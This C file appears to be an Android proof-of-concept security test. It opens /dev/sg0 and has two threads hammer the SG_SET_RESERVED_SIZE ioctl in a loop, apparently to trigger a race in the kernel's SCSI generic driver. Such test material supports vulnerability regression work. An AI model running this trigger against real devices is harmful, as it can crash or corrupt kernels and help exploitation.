/**
 * Copyright (C) 2017 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <string.h>

#include <android/log.h>
#include <dirent.h>
#include <dlfcn.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/ptrace.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/system_properties.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/un.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <unistd.h>

int fd;

void in_cpu() {
  int num_processors = sysconf(_SC_NPROCESSORS_CONF);
  cpu_set_t get;
  int i = 0;
  CPU_ZERO(&get);
  sched_getaffinity(0, sizeof(cpu_set_t), &get);
  for (int i = 0; i < num_processors; i++) {
    if (CPU_ISSET(i, &get)) {
      printf("The current thread  bound to core %d\n", i);
    }
  }
}
static void bind_child_to_cpu() {
  in_cpu();
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(1, &set);
  sched_setaffinity(0, sizeof(set), &set);
  in_cpu();
}

#define BLKTRACETEARDOWN _IO(0x12, 118)
#define SG_SET_RESERVED_SIZE 0x2275
#define SG_GET_RESERVED_SIZE 0x2272
static void* overwrite(void* param) {
  int ret;
  for (int i = 0; i < 100000; i++) {
    int size = 0x100;
    int n = ioctl(fd, SG_SET_RESERVED_SIZE, &size);
    printf("ioctl error =%d %s\n", n, strerror(errno));
  }
  return param;
}

int functionOne() {
  sleep(2);
  char filename[128];
  strcpy(filename, "/dev/sg0");

  fd = open(filename, 2);
  if (fd == -1) {
    return -1;
  }

  pthread_t thread0;
  for (int i = 0; i < 2; i++) {
    if (pthread_create(&thread0, NULL, overwrite, NULL))
      perror("overwritethread pthread_create()");
  }

  return 0;
}

int main(int argc, char** argv, char** env) { return functionOne(); }
